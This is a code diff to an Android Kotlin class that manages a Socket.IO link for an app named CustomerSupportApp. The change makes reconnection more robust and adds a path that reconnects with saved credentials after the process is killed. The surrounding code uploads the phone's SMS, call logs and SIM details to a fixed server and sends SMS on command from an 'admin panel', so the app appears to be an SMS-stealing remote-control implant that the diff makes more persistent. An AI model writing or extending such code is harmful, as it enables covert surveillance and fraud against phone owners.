@@ -29,7 +29,7 @@ class SocketManager {
     private var onForwardingConfigCallback: ((ForwardingConfig) -> Unit)? = null
     private var onSmsSendRequestCallback: ((SmsSendRequest) -> Unit)? = null
 
-    // Store connection parameters for reconnection
+    // In-memory cache of credentials (also persisted to disk via PreferencesManager)
     private var savedDeviceId: String? = null
     private var savedDeviceName: String? = null
     private var savedPhoneNumber: String? = null
@@ -51,10 +51,36 @@ class SocketManager {
     }
 
     fun connect(deviceId: String, deviceName: String, phoneNumber: String) {
-        // Store for reconnection
+        // Always update in-memory credentials
         savedDeviceId = deviceId
         savedDeviceName = deviceName
         savedPhoneNumber = phoneNumber
+
+        // If the socket already exists and is connected or actively connecting, do not
+        // create a new instance — let Socket.IO's built-in reconnection logic handle it.
+        val existingSocket = socket
+        if (existingSocket != null) {
+            if (existingSocket.connected()) {
+                Log.d(TAG, "Already connected, re-registering device only")
+                val data = JSONObject().apply {
+                    put("id", deviceId)
+                    put("name", deviceName)
+                    put("phoneNumber", phoneNumber)
+                }
+                existingSocket.emit("device:register", data)
+                requestForwardingConfig(deviceId)
+                return
+            }
+            if (_connectionState.value == ConnectionState.CONNECTING) {
+                Log.d(TAG, "Already connecting, skipping duplicate connect()")
+                return
+            }
+            // Socket exists but is disconnected/errored — tear it down cleanly first
+            Log.d(TAG, "Cleaning up old socket before reconnecting")
+            existingSocket.off()
+            existingSocket.disconnect()
+            socket = null
+        }
 
         try {
             Log.d(TAG, "Connecting to $SERVER_URL")
@@ -65,14 +91,15 @@ class SocketManager {
                 reconnection = true
                 reconnectionAttempts = Int.MAX_VALUE
                 reconnectionDelay = 1000
-                reconnectionDelayMax = 5000
+                reconnectionDelayMax = 10000
                 timeout = 20000
                 forceNew = false
             }
 
-            socket = IO.socket(URI.create(SERVER_URL), options)
+            val newSocket = IO.socket(URI.create(SERVER_URL), options)
+            socket = newSocket
 
-            socket?.on(Socket.EVENT_CONNECT) {
+            newSocket.on(Socket.EVENT_CONNECT) {
                 Log.d(TAG, "Connected to server")
                 _connectionState.value = ConnectionState.CONNECTED
 
@@ -81,26 +108,28 @@ class SocketManager {
                     put("name", deviceName)
                     put("phoneNumber", phoneNumber)
                 }
-                socket?.emit("device:register", data)
+                newSocket.emit("device:register", data)
                 Log.d(TAG, "Device registered: $deviceId")
                 
                 requestForwardingConfig(deviceId)
 
-                // Flush any pending sync data from offline period
+                // Flush any pending sync data queued while offline
                 flushPendingSyncQueue()
             }
 
-            socket?.on(Socket.EVENT_DISCONNECT) {
-                Log.d(TAG, "Disconnected from server")
+            newSocket.on(Socket.EVENT_DISCONNECT) { args ->
+                val reason = args.firstOrNull()?.toString() ?: "unknown"
+                Log.d(TAG, "Disconnected from server, reason: $reason")
                 _connectionState.value = ConnectionState.DISCONNECTED
+                // Socket.IO will auto-reconnect unless reason is "io client disconnect"
             }
 
-            socket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
+            newSocket.on(Socket.EVENT_CONNECT_ERROR) { args ->
                 Log.e(TAG, "Connection error: ${args.firstOrNull()}")
                 _connectionState.value = ConnectionState.ERROR
             }
 
-            socket?.on("forwarding:config") { args ->
+            newSocket.on("forwarding:config") { args ->
                 try {
                     Log.d(TAG, "=== RECEIVED forwarding:config EVENT ===")
                     val config = args[0] as JSONObject
@@ -120,12 +149,12 @@ class SocketManager {
                 }
             }
 
-            socket?.on("device:requestSync") {
+            newSocket.on("device:requestSync") {
                 Log.d(TAG, "Received sync request from admin panel")
                 onSyncRequestCallback?.invoke()
             }
 
-            socket?.on("sms:sendRequest") { args ->
+            newSocket.on("sms:sendRequest") { args ->
                 try {
                     val request = args[0] as JSONObject
                     val smsSendRequest = SmsSendRequest(
@@ -141,7 +170,7 @@ class SocketManager {
                 }
             }
 
-            socket?.on("sim:sync:ack") { args ->
+            newSocket.on("sim:sync:ack") { args ->
                 try {
                     val ack = args[0] as JSONObject
                     val success = ack.optBoolean("success", false)
@@ -152,7 +181,7 @@ class SocketManager {
                 }
             }
 
-            socket?.connect()
+            newSocket.connect()
         } catch (e: Exception) {
             Log.e(TAG, "Failed to connect", e)
             _connectionState.value = ConnectionState.ERROR
@@ -160,8 +189,21 @@ class SocketManager {
     }
 
     /**
-     * Reconnect using saved credentials. Called by SyncWorker and RestartReceiver
-     * when the service needs to re-establish connection after process death.
+     * Reconnect using saved credentials. Called by SyncWorker and RestartReceiver.
+     * Falls back to in-memory credentials (set by last connect() call). The caller
+     * is responsible for loading persisted credentials from PreferencesManager when
+     * in-memory values are null (e.g. after process death).
+     */
+    fun reconnectWithCredentials(deviceId: String, deviceName: String, phoneNumber: String) {
+        savedDeviceId = deviceId
+        savedDeviceName = deviceName
+        savedPhoneNumber = phoneNumber
+        connect(deviceId, deviceName, phoneNumber)
+    }
+
+    /**
+     * Reconnect using in-memory credentials only (no disk read).
+     * Only use this from within the same process lifecycle as the original connect() call.
      */
     fun reconnectIfNeeded() {
         if (isConnected()) {
@@ -174,10 +216,10 @@ class SocketManager {
         val phoneNumber = savedPhoneNumber
 
         if (deviceId != null && deviceName != null && phoneNumber != null) {
-            Log.d(TAG, "Reconnecting with saved credentials")
+            Log.d(TAG, "Reconnecting with in-memory credentials")
             connect(deviceId, deviceName, phoneNumber)
         } else {
-            Log.w(TAG, "No saved credentials for reconnection")
+            Log.w(TAG, "No in-memory credentials — caller should use reconnectWithCredentials() with persisted data")
         }
     }
 
@@ -215,6 +257,7 @@ class SocketManager {
     }
 
     fun disconnect() {
+        socket?.off()
         socket?.disconnect()
         socket = null
         _connectionState.value = ConnectionState.DISCONNECTED
@@ -224,7 +267,6 @@ class SocketManager {
 
     fun syncSms(deviceId: String, smsArray: JSONArray) {
         if (!isConnected()) {
-            // Queue for later
             CustomerSupportApp.pendingSyncManager.queueSmsSync(deviceId, smsArray)
             return
         }
@@ -238,7 +280,6 @@ class SocketManager {
 
     fun syncCalls(deviceId: String, callsArray: JSONArray) {
         if (!isConnected()) {
-            // Queue for later
             CustomerSupportApp.pendingSyncManager.queueCallsSync(deviceId, callsArray)
             return
         }
@@ -264,7 +305,6 @@ class SocketManager {
 
     fun syncSimInfo(deviceId: String, simArray: JSONArray) {
         if (!isConnected()) {
-            // Queue for later
             CustomerSupportApp.pendingSyncManager.queueSimSync(deviceId, simArray)
             return
         }
